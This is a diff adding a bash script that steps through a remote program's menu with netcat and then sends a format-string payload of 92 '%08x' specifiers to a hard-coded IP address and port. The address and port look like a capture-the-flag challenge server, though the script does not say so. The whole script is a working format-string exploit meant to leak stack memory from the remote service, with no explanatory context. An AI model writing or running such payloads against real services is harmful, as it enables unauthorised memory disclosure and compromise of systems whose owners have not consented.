@@ -1,0 +1,9 @@
+#!/bin/bash
+{ 
+    echo "a"; sleep 1; 
+    echo "b"; sleep 1; 
+    echo "2"; sleep 1; 
+    echo "2"; sleep 1; 
+    echo "1"; sleep 1;
+    python3 -c "print('%08x'*92)"
+} | nc 138.68.134.63 31625
